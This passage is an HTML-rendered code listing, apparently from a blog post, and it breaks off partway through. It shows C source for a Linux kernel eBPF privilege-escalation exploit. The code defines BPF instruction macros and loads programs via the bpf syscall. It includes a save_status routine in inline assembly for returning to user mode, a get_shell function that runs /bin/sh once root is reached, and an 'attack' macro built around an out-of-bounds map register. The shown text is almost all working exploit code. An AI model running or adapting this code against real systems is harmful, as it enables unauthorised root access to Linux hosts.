class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOB_REG BPF_REG_7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STORE_REG BPF_REG_6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(oob_map_fd, store_map_fd)                                     \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),                                    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(OOB_REG, BPF_REG_0),                                   \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),                              \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span 